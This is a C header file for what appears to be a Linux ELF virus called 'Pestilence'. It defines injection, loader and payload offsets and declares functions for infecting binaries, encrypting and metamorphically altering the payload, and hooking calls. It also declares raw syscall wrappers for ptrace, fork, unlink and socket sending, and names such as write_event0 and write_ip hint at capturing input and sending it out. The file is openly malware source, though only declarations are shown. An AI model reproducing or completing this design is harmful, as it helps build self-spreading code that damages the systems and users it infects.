#ifndef PESTILENCE_H
# define PESTILENCE_H

# define _GNU_SOURCE 1
# include <elf.h>
# include <unistd.h>
# include <sys/mman.h>
# include <stdlib.h>
# include <stdio.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <limits.h>
# include <signal.h>
# include <linux/input.h>
# include <sys/socket.h>
# include <sys/user.h>
# include <netinet/in.h>


# define KEY 0x62F98A47
# define SUB 0x95837523
# define MAGIC_VIRUS 0x4E505241
# define SIGN_SIZE 0x25

# define FT_MEMCPY_ADDR 0x16c0
# define BUF_SIZE 0x20
# define BIS_SIZE 0x49f
# define LOADER_SIZE 0xe8
# define PAYLOAD_SIZE 0x6731 - FT_MEMCPY_ADDR + 0x7
# define MAIN_OFFSET 0x623a - FT_MEMCPY_ADDR
# define MAIN_SIZE 0x6731 - 0x623a + 0x7
# define INJECT_SIZE LOADER_SIZE + SIGN_SIZE + 8

# define OFFSET_1 0x4d13 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_2 0x4c1b + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_3 0x4d55 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_4 0x6245 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_5 0x197c + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_6 0x5add + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_7 0x4f8f + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_8 0x629b + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_RIP 0x5aec - FT_MEMCPY_ADDR

# define OFFSET_HOOK_1 0x5b07 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_1 0x5afd + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_2 0x5b34 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_2 0x5b2a + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_3 0x5b61 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_3 0x5b57 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_4 0x5b8e + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_4 0x5b84 + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_HOOK_5 0x5bbb + BIS_SIZE - FT_MEMCPY_ADDR
# define OFFSET_CALL_5 0x5bb1 + BIS_SIZE - FT_MEMCPY_ADDR


typedef struct		s_info
{
	void		*file;
	int		fd;
	size_t		file_size;
	void		*text_begin;
	size_t		text_size;
	size_t		text_addr;

	void		*addr_call_to_replace;
	void		*addr_hooked_func;

	size_t		bss_size;
	size_t		begin_bss;
	size_t		offset_bis;
	size_t		addr_bis;

	int32_t		valid_target;
	int32_t		in_pestilence;

// 	size_t		tab_addr[12];
	size_t		*tab_addr;
}					t_info;

typedef struct		s_fingerprint
{
	uint32_t	fingerprint;
	uint32_t	index;
}					t_fingerprint;

struct linux_dirent64 {
	ino64_t        d_ino;    /* 64-bit inode number */
	off64_t        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[PATH_MAX]; /* Filename (null-terminated) */
};

void		loader();
int		main();
void		ft_end();
void		syscalls();
void		ft_nothing();

/*			**** FILL_BUFF ****				*/
void		write_begin(char *buf);
void		write_filename_src(char *buf);
void		write_test(char *buf);
void		write_test2(char *buf);
void		write_sign(char *buf);
void		write_proc(char *buf);
void		write_exe(char *buf);
void		write_inhibitor(char *buf);
void		write_stat(char *buf);
void		write_event0(char *buf);
void		write_ip(char *buf);

/*			**** CHECK OWN FILE ****			*/
void		update_own_index(t_fingerprint *fingerprint, t_info *info);
void		rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st);
void		get_path_own_file(char *buf, t_info *info);

/*			**** METAMORPH ****				*/
void		metamorph(t_info *info, t_fingerprint *fingerprint);
unsigned char	hash_fingerprint(int fingerprint, int nb);

/*			**** UTILS ****					*/
void		itoa(char *buf, int32_t nb);
void		ft_memcpy(void *dest, void *src, size_t size);
void		ft_memcpy_r(void *dest, void *src, size_t size);
void		ft_memset(void *ptr, size_t size, unsigned char val);
char		*ft_strcat(char *dest, const char *src);
int		ft_strncmp(const char *s1, const char *s2, int n);
int		ft_strlen(const char *s);
void		*get_rip();
void		double_ret();
uint32_t	get_key_func(int nb);

/*			**** CRYPTO ****				*/
void		patch_key(t_info *info, uint32_t key);
uint32_t	hash_loader(t_info *info);
uint32_t        hash_func(void *addr, size_t size, uint32_t hash);
uint32_t	encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint);
void		crypt_payload(t_info *info, uint32_t fingerprint);
uint32_t        encrypt_func(void *addr, size_t size, uint32_t key);
uint32_t        decrypt_func(t_info *info, void *addr, size_t size, uint32_t nb);
void            reencrypt_func(t_info *info, void *addr, size_t size, uint32_t key);

/*			**** PATCH ****					*/
void		patch_addresses(t_info *info);
void		patch_bis(t_info *info, int32_t nb);
void		patch_payload(t_info *info);
void		patch_loader(t_info *info, uint32_t hash);

/*			**** PARSING ****				*/
int             update_index(t_fingerprint *fingerprint, t_info *info);
int             check_magic(t_info *info, t_fingerprint *fingerprint);
size_t          get_padding_size(t_info *info, Elf64_Phdr *program_header, int nb_hp);
int             valid_call(t_info *info, int pos);
void            patch_sections_header(t_info *info, size_t offset, size_t to_add);
int		find_text(t_info *info, t_fingerprint *fingerprint);
void            hook_call(t_info *info, int32_t nb);
void            patch_close_entries(t_info *info, int32_t nb);
void		epo_parsing(t_info *info);
int		pe_parsing(t_info *info);
int             parse_process(char *path, int pid_len, char *buf_inhibitor);
int		check_process(char *buf_path, t_info *info);
uint32_t	mprotect_text(int prot);

/*			**** LIB SYSCALL ****				*/
int		ft_sysopen(const char *pathname, int flags);
int		ft_sysopenmode(const char *pathname, int flags, int mode);
int		ft_sysclose(int fd);
ssize_t 	ft_syswrite(int fd, const void *buf, size_t count);
void		*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int		ft_sysptrace(long request, long pid, unsigned long addr, unsigned long data);
void		*ft_sysmunmap(void *addr, size_t len);
int		ft_sysfstat(int fd, struct stat *buf); 
int		ft_sysgetdents(unsigned int fd, char *buf, unsigned int count);
pid_t		ft_sysgetpid();
void		ft_sysreadlink(char *sym_path, char *real_path, size_t size);
int		ft_sysunlink(char *path);
ssize_t		ft_sysread(int fd, void *buf, size_t count);
pid_t		ft_sysfork();
void		ft_sysexit(int status);
int		ft_syssocket(int family, int type, int protocol);
int		ft_syssendto(int fd, void *buf, size_t len, unsigned int flags, struct sockaddr *addr, int addr_len);
int		ft_sysmprotect(void *start, size_t len, size_t prot);


#endif
